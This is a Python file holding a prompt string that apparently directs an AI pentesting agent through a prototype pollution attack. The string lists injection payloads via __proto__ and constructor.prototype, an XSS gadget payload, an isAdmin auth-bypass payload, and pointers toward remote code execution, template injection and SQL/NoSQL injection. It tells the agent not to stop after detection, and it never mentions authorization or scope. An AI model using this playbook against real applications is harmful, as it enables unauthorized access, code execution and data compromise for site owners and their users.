"""
Prototype Pollution Attack Skill Prompt.
"""

PROTOTYPE_POLLUTION_SKILL_PROMPT = """
## ATTACK SKILL: PROTOTYPE POLLUTION

**CRITICAL: This attack skill has been CLASSIFIED as prototype pollution.**

### MANDATORY PROTOTYPE POLLUTION WORKFLOW

#### STEP 1: DETECTION

Test if object merge/assign operations are vulnerable. Inject these into JSON/query params:
```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
{"__proto__[polluted]": true}
```

If the app uses vulnerable Lodash (<4.17.21), jQuery (<3.4.0), Hoek, or merge/deep-extend.

#### STEP 2: EXPLOITATION — DOM XSS

Once polluted, trigger the gadget:
```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```
Common gadgets: `object.innerHTML`, `script.src`, `iframe.srcdoc`, `eval()` arguments.

#### STEP 3: SERVER-SIDE PROTOTYPE POLLUTION

Node.js server-side pollution can lead to:
- Auth bypass: `{"__proto__": {"isAdmin": true}}`
- RCE via `child_process.exec` options injection
- SSTI in template engines (Pug, Handlebars, EJS)
- SQLi/NoSQLi via query builder option injection

#### ANTI-PATTERNS: Don't stop after client-side detection — server-side Node.js pollution is higher impact. Test BOTH `__proto__` and `constructor.prototype` paths.
"""
